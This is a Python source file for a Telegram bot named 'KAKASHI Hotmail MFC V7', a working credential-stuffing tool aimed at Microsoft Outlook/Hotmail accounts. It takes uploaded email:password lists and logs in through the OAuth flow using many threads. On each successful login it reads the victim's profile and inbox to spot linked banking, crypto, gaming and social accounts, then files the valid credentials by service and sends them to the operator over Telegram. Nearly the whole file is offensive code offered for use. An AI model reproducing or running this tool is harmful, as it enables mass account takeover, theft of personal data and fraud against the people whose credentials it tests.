import os
import sys
import io
import time
import uuid
import pycountry
import requests
import threading
import concurrent.futures
import random
import re
from threading import Lock, Semaphore

from colorama import Fore, Style, init
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# ====================== BOT TOKEN ======================
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"   # ← CHANGE THIS TO YOUR BOT TOKEN

# ====================== GLOBAL COUNTERS ======================
lock = threading.Lock()
hit = 0
bad = 0
retry = 0
total_combos = 0
processed = 0
linked_accounts = {}
checked_accounts = set()
rate_limit_semaphore = Semaphore(500)

init(autoreset=True)

# ====================== SERVICES (full from your script) ======================
services = {
    # Social Media
    "Facebook": {"sender": "security@facebookmail.com", "file": "facebook_accounts.txt"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "instagram_accounts.txt"},
    "TikTok": {"sender": "register@account.tiktok.com", "file": "tiktok_accounts.txt"},
    "Twitter": {"sender": "info@x.com", "file": "twitter_accounts.txt"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "linkedin_accounts.txt"},
    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "pinterest_accounts.txt"},
    "Reddit": {"sender": "noreply@reddit.com", "file": "reddit_accounts.txt"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "snapchat_accounts.txt"},
    "VK": {"sender": "noreply@vk.com", "file": "vk_accounts.txt"},
    "WeChat": {"sender": "no-reply@wechat.com", "file": "wechat_accounts.txt"},
    
    # Messaging
    "WhatsApp": {"sender": "no-reply@whatsapp.com", "file": "whatsapp_accounts.txt"},
    "Telegram": {"sender": "telegram.org", "file": "telegram_accounts.txt"},
    "Discord": {"sender": "noreply@discord.com", "file": "discord_accounts.txt"},
    "Signal": {"sender": "no-reply@signal.org", "file": "signal_accounts.txt"},
    "Line": {"sender": "no-reply@line.me", "file": "line_accounts.txt"},
    
    # Streaming & Entertainment
    "Netflix": {"sender": "info@account.netflix.com", "file": "netflix_accounts.txt"},
    "Spotify": {"sender": "no-reply@spotify.com", "file": "spotify_accounts.txt"},
    "Twitch": {"sender": "no-reply@twitch.tv", "file": "twitch_accounts.txt"},
    "YouTube": {"sender": "no-reply@youtube.com", "file": "youtube_accounts.txt"},
    "Vimeo": {"sender": "noreply@vimeo.com", "file": "vimeo_accounts.txt"},
    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "disneyplus_accounts.txt"},
    "Hulu": {"sender": "account@hulu.com", "file": "hulu_accounts.txt"},
    "HBO Max": {"sender": "no-reply@hbomax.com", "file": "hbomax_accounts.txt"},
    "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "amazonprime_accounts.txt"},
    "Apple TV+": {"sender": "no-reply@apple.com", "file": "appletv_accounts.txt"},
    "Crunchyroll": {"sender": "noreply@crunchyroll.com", "file": "crunchyroll_accounts.txt"},
    
    # E-commerce & Shopping
    "Amazon": {"sender": "auto-confirm@amazon.com", "file": "amazon_accounts.txt"},
    "eBay": {"sender": "newuser@nuwelcome.ebay.com", "file": "ebay_accounts.txt"},
    "Shopify": {"sender": "no-reply@shopify.com", "file": "shopify_accounts.txt"},
    "Etsy": {"sender": "transaction@etsy.com", "file": "etsy_accounts.txt"},
    "AliExpress": {"sender": "no-reply@aliexpress.com", "file": "aliexpress_accounts.txt"},
    "Walmart": {"sender": "no-reply@walmart.com", "file": "walmart_accounts.txt"},
    "Target": {"sender": "no-reply@target.com", "file": "target_accounts.txt"},
    "Best Buy": {"sender": "no-reply@bestbuy.com", "file": "bestbuy_accounts.txt"},
    "Newegg": {"sender": "no-reply@newegg.com", "file": "newegg_accounts.txt"},
    "Wish": {"sender": "no-reply@wish.com", "file": "wish_accounts.txt"},
    
    # Payment & Finance
    "PayPal": {"sender": "service@paypal.com.br", "file": "paypal_accounts.txt"},
    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "binance_accounts.txt"},
    "Coinbase": {"sender": "no-reply@coinbase.com", "file": "coinbase_accounts.txt"},
    "Kraken": {"sender": "no-reply@kraken.com", "file": "kraken_accounts.txt"},
    "Bitfinex": {"sender": "no-reply@bitfinex.com", "file": "bitfinex_accounts.txt"},
    "OKX": {"sender": "noreply@okx.com", "file": "okx_accounts.txt"},
    "Bybit": {"sender": "no-reply@bybit.com", "file": "bybit_accounts.txt"},
    "Bitkub": {"sender": "no-reply@bitkub.com", "file": "bitkub_accounts.txt"},
    "Revolut": {"sender": "no-reply@revolut.com", "file": "revolut_accounts.txt"},
    "TransferWise": {"sender": "no-reply@transferwise.com", "file": "transferwise_accounts.txt"},
    "Venmo": {"sender": "no-reply@venmo.com", "file": "venmo_accounts.txt"},
    "Cash App": {"sender": "no-reply@cash.app", "file": "cashapp_accounts.txt"},
    
    # Gaming Platforms
    "Steam": {"sender": "noreply@steampowered.com", "file": "steam_accounts.txt"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "xbox_accounts.txt"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "playstation_accounts.txt"},
    "EpicGames": {"sender": "help@acct.epicgames.com", "file": "epicgames_accounts.txt"},
    "Rockstar": {"sender": "noreply@rockstargames.com", "file": "rockstar_accounts.txt"},
    "EA Sports": {"sender": "EA@e.ea.com", "file": "easports_accounts.txt"},
    "Ubisoft": {"sender": "noreply@ubisoft.com", "file": "ubisoft_accounts.txt"},
    "Blizzard": {"sender": "noreply@blizzard.com", "file": "blizzard_accounts.txt"},
    "Riot Games": {"sender": "no-reply@riotgames.com", "file": "riotgames_accounts.txt"},
    "Valorant": {"sender": "noreply@valorant.com", "file": "valorant_accounts.txt"},
    "Genshin Impact": {"sender": "noreply@hoyoverse.com", "file": "genshin_accounts.txt"},
    "PUBG": {"sender": "noreply@pubgmobile.com", "file": "pubg_accounts.txt"},
    "Free Fire": {"sender": "noreply@freefire.com", "file": "freefire_accounts.txt"},
    "Mobile Legends": {"sender": "noreply@mobilelegends.com", "file": "mobilelegends_accounts.txt"},
    "Call of Duty": {"sender": "noreply@callofduty.com", "file": "cod_accounts.txt"},
    "Fortnite": {"sender": "noreply@epicgames.com", "file": "fortnite_accounts.txt"},
    "Roblox": {"sender": "accounts@roblox.com", "file": "roblox_accounts.txt"},
    "Minecraft": {"sender": "noreply@mojang.com", "file": "minecraft_accounts.txt"},
    "Supercell": {"sender": "noreply@id.supercell.com", "file": "supercell_accounts.txt"},
    "Nintendo": {"sender": "no-reply@accounts.nintendo.com", "file": "nintendo_accounts.txt"},
    # Add more if you want, but this covers most
}

def get_flag(country_name):
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except LookupError:
        return '🏳'

def save_account_by_type(service_name, email, password):
    if service_name in services:
        if not os.path.exists("Accounts"):
            os.makedirs("Accounts")
        filename = os.path.join("Accounts", services[service_name]["file"])
        account_line = f"{email}:{password}\n"
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                if account_line in f.readlines():
                    return
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(account_line)
        with lock:
            linked_accounts[service_name] = linked_accounts.get(service_name, 0) + 1

def get_capture(email, password, token, cid, context, update):
    global hit
    try:
        # Profile Info
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}"
        }
        response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=25).json()
        
        name = response.get('names', [{}])[0].get('displayName', 'Unknown')
        country = response.get('accounts', [{}])[0].get('location', 'Unknown')
        flag = get_flag(country)

        try:
            birthdate = f"{response['accounts'][0]['birthYear']}-{response['accounts'][0]['birthMonth']:02d}-{response['accounts'][0]['birthDay']:02d}"
        except:
            birthdate = "Unknown"

        # Inbox Check
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        inbox_headers = {
            "Host": "outlook.live.com",
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
            "x-owa-sessionid": cid,
        }
        inbox_response = requests.post(url, headers=inbox_headers, data="", timeout=25).text

        linked_services = []
        for service_name, info in services.items():
            sender = info["sender"]
            if sender in inbox_response:
                linked_services.append(f"✔ {service_name}")
                save_account_by_type(service_name, email, password)

        linked_str = "\n".join(linked_services) if linked_services else "No linked services found"

        # YOUR EXACT HIT FORMAT
        capture = f"""
🔱 HOTMAİL HİT BULUNDU 🔱
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
📧 Email: {email}
🔑 Password: {password}
👤 Name: {name}
🌍 Country: {flag} {country}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
🔗 EMAIL IN INBOX:
{linked_str}

📊 Toplam Hit: {hit + 1}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT
"""

        # Send instantly
        context.bot.send_message(update.effective_chat.id, capture.strip(), parse_mode='HTML')

        # Save to file
        with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
            f.write(capture + "\n" + "="*60 + "\n")

        with lock:
            hit += 1
            processed += 1

    except:
        with lock:
            processed += 1

def check_account(email, password):
    try:
        session = requests.Session()
        
        # IDP Check
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
        
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            return {"status": "BAD"}
        
        # OAuth
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
        
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        
        if not url_match or not ppft_match:
            return {"status": "BAD"}
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        
        # Login
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        
        r3 = session.post(post_url, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }, allow_redirects=False, timeout=15)
        
        if any(x in r3.text.lower() for x in ["incorrect", "invalid", "error"]):
            return {"status": "BAD"}
        
        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "BAD"}
        
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "BAD"}
        
        code = code_match.group(1)
        
        # Token
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        
        if r4.status_code != 200 or "access_token" not in r4.text:
            return {"status": "BAD"}
        
        token_json = r4.json()
        access_token = token_json["access_token"]
        
        # CID
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        
        return {"status": "HIT", "token": access_token, "cid": cid}
        
    except requests.exceptions.Timeout:
        return {"status": "RETRY"}
    except Exception:
        return {"status": "RETRY"}

def check_combo(email, password, context, update):
    global hit, bad, retry, processed
    account_id = f"{email}:{password}"
    if account_id in checked_accounts:
        with lock: processed += 1
        return
    checked_accounts.add(account_id)

    with rate_limit_semaphore:
        time.sleep(random.uniform(0.01, 0.05))
        result = check_account(email, password)
        
        with lock:
            if result.get("status") == "HIT":
                get_capture(email, password, result["token"], result["cid"], context, update)
            elif result.get("status") == "BAD":
                bad += 1
            else:
                retry += 1
            processed += 1

# ====================== TELEGRAM BOT ======================
WAITING_COMBO = 1
WAITING_THREADS = 2

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 <b>KAKASHI Hotmail MFC V7 Telegram Bot</b>\n\nSend combo file (.txt)", parse_mode='HTML')
    return WAITING_COMBO

async def receive_combo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.document:
        file = await update.message.document.get_file()
        await file.download_to_drive("combo.txt")
        context.user_data['combo_file'] = "combo.txt"
        await update.message.reply_text("✅ Combo received!\n\nSend threads (20-500 recommended):")
        return WAITING_THREADS
    await update.message.reply_text("Please send .txt combo file!")
    return WAITING_COMBO

async def receive_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        threads = int(update.message.text.strip())
        if not 1 <= threads <= 1000:
            raise ValueError
        context.user_data['threads'] = threads
        await update.message.reply_text(f"🚀 Starting with {threads} threads...\nHits will come instantly in your format!")
        
        threading.Thread(target=run_checker, args=(context, update), daemon=True).start()
        return ConversationHandler.END
    except:
        await update.message.reply_text("❌ Enter valid number (1-1000)")
        return WAITING_THREADS

def run_checker(context, update):
    global total_combos, processed, hit, bad, retry, linked_accounts
    hit = bad = retry = processed = 0
    linked_accounts.clear()
    checked_accounts.clear()

    with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if ":" in line]
    total_combos = len(lines)

    context.bot.send_message(update.effective_chat.id, f"📊 Total combos loaded: {total_combos}\nStarting check...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=context.user_data['threads']) as executor:
        for line in lines:
            try:
                email, pw = line.split(":", 1)
                executor.submit(check_combo, email.strip(), pw.strip(), context, update)
            except:
                continue

    time.sleep(5)
    context.bot.send_message(update.effective_chat.id, f"✅ Check Completed!\nTotal Hits: {hit} | Bad: {bad}")

# ====================== RUN BOT ======================
def main():
    app = Application.builder().token(TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_COMBO: [MessageHandler(filters.Document.ALL, receive_combo)],
            WAITING_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_threads)],
        },
        fallbacks=[],
    )
    app.add_handler(conv_handler)
    print("🤖 KAKASHI Hotmail Bot is running... Send /start")
    app.run_polling()

if __name__ == "__main__":
    if not os.path.exists("Accounts"):
        os.makedirs("Accounts")
    main()